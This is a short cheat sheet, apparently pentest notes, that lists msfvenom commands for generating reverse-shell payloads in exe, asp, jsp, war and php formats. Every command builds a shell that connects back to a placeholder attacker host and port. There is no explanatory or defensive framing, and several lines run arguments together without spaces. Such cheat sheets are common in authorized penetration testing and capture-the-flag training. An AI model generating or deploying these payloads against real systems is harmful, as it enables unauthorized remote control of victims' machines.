# exe(32)
```zsh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP>LPORT=<PORT>-f exe >shell-x86.exe
```

# exe(64)
```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP>LPORT=<PORT>-f exe >shell-x64.exe
```

# asp
```zsh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP>LPORT=<PORT>-f asp >shell.asp
```

# jsp
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP>LPORT=<PORT>-f raw >shell.jsp
```

# war
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP>LPORT=<PORT>-f war >shell.war
```

# php
```
msfvenom -p php/reverse_php LHOST=<IP>LPORT=<PORT>-f raw >shell.php
```